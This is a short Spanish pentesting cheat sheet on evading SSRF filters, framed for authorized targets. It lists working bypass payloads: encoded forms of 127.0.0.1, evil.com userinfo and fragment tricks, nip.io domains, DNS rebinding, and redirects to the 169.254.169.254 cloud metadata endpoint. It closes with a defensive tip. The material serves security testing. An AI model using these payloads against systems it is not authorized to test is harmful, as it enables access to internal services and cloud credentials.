# SSRF — Evasión de filtros

Ver índice: [ssrf.md](ssrf.md). **Solo sobre objetivos autorizados.** Cuando la app intenta bloquear destinos internos.

## Representaciones alternativas de 127.0.0.1

```
http://127.0.0.1        http://localhost
http://127.1            http://0
http://2130706433       (decimal)
http://0x7f000001       (hex)
http://0177.0.0.1       (octal)
http://[::1]            http://[::ffff:127.0.0.1]
```

## Trucos de dominio

```
http://127.0.0.1.nip.io/         (DNS que resuelve a interno)
http://localtest.me/
http://evil.com@127.0.0.1/       (userinfo)
http://127.0.0.1#@evil.com/
http://evil.com/redirige-a-interno    (redirección abierta encadenada)
```

## Bypass de validación de esquema/host

```
- Mayúsculas: HtTp://
- Espacios/caracteres raros antes del host
- Doble URL-encoding del host
- Parser diferencial: la app valida un parser y la request usa otro
```

## DNS rebinding

Un dominio que primero resuelve a una IP pública (pasa la validación) y, en la segunda resolución (la que hace la petición real), a una IP interna. Útil contra validaciones que resuelven y comprueban **antes** de la petición.

## Redirecciones

Si el fetch sigue redirecciones, apunta a un endpoint tuyo que responda `302` a `http://169.254.169.254/...` o a un recurso interno.

## Notas

- Combina técnicas: p. ej. dominio propio + redirección + IP en decimal.
- La defensa robusta valida **tras** resolver DNS y bloquea rangos internos; documenta cuál falla.
